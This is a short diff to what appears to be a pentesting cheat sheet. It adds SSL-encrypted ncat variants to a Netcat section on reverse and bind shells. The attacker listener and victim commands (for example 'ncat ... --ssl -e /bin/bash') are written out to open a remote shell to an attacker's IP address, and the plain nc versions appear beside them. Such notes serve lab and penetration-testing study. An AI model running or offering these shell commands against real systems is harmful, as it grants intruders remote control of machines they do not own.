@@ -28,8 +28,8 @@ From victim machine we have to cert .pem file we can generate certificate and tr
 
 # Netcat
 ## Reverse shell<br>
-**Attacker:** `nc -lvnp 4444`<br>
-**Victim:** `nc 192.168.0.107 4444 -e /bin/bash`<br>
+**Attacker:** `nc -lvnp 4444`<br> **Encrypted:** `ncat -l 8080 --ssl -v`
+**Victim:** `nc 192.168.0.107 4444 -e /bin/bash`<br> **Encrypted:** `ncat 192.168.0.110 8080 --ssl -e /bin/bash -v`
 
 ## Bind shell
 **Victim:** `nc -lvp 4444 -e /bin/bash`<br>
